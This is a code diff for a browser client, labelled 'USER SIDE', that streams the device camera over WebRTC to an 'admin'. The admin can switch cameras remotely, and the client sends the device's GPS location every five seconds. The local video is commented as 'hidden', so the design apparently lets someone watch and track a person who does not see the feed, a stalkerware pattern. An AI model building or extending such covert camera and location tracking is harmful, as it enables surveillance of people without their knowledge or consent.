@@ -1,4 +1,4 @@
-// USER SIDE (RELIABLE CAMERA SWITCH)
+// USER SIDE — FINAL STABLE VERSION
 const socket = io();
 
 let pc = null;
@@ -6,14 +6,18 @@ let stream = null;
 let videoDevices = [];
 let currentDeviceIndex = 0;
 
-// Get available cameras
+// Load available cameras
 async function loadCameras() {
   const devices = await navigator.mediaDevices.enumerateDevices();
   videoDevices = devices.filter(d => d.kind === "videoinput");
+
+  if (videoDevices.length === 0) {
+    alert("No camera found");
+  }
 }
 
-// Create WebRTC connection
-function createPC(track) {
+// Create PeerConnection
+function createPC(stream) {
   const pc = new RTCPeerConnection({
     iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
   });
@@ -22,12 +26,17 @@ function createPC(track) {
     if (e.candidate) socket.emit("ice-candidate", e.candidate);
   };
 
-  pc.addTrack(track);
+  // ✅ CORRECT: add track WITH stream
+  stream.getTracks().forEach(track => {
+    pc.addTrack(track, stream);
+  });
+
   return pc;
 }
 
 // Start camera with specific deviceId
 async function startCamera(deviceId) {
+  // stop old stream
   if (stream) stream.getTracks().forEach(t => t.stop());
 
   stream = await navigator.mediaDevices.getUserMedia({
@@ -35,40 +44,51 @@ async function startCamera(deviceId) {
     audio: false
   });
 
+  // hidden local video
   document.getElementById("camera").srcObject = stream;
 
+  // reset peer connection
   if (pc) pc.close();
-  pc = createPC(stream.getVideoTracks()[0]);
+  pc = createPC(stream);
 
+  // create and send offer
   const offer = await pc.createOffer();
   await pc.setLocalDescription(offer);
   socket.emit("offer", offer);
 }
 
-// Switch camera
+// Switch camera (admin-controlled)
 async function switchCamera() {
   if (videoDevices.length < 2) return;
 
-  currentDeviceIndex = (currentDeviceIndex + 1) % videoDevices.length;
+  currentDeviceIndex =
+    (currentDeviceIndex + 1) % videoDevices.length;
+
   await startCamera(videoDevices[currentDeviceIndex].deviceId);
 }
 
-// Admin triggers camera switch
+// 🔁 ADMIN triggers camera switch
 socket.on("switch-camera", () => {
   switchCamera();
 });
 
-// Admin answer
+// ADMIN answer
 socket.on("answer", async answer => {
-  if (pc) await pc.setRemoteDescription(new RTCSessionDescription(answer));
+  if (pc) {
+    await pc.setRemoteDescription(new RTCSessionDescription(answer));
+  }
 });
 
-// ICE
+// ICE from admin
 socket.on("ice-candidate", async candidate => {
-  if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate));
+  if (pc && candidate) {
+    try {
+      await pc.addIceCandidate(new RTCIceCandidate(candidate));
+    } catch {}
+  }
 });
 
-// Location
+// Location updates
 setInterval(() => {
   navigator.geolocation.getCurrentPosition(pos => {
     socket.emit("location", {
@@ -78,11 +98,11 @@ setInterval(() => {
   });
 }, 5000);
 
-// Init
+// INIT
 (async () => {
   await loadCameras();
 
-  // Prefer back camera if available
+  // Prefer back camera if exists
   if (videoDevices.length > 1) {
     currentDeviceIndex = videoDevices.length - 1;
   }
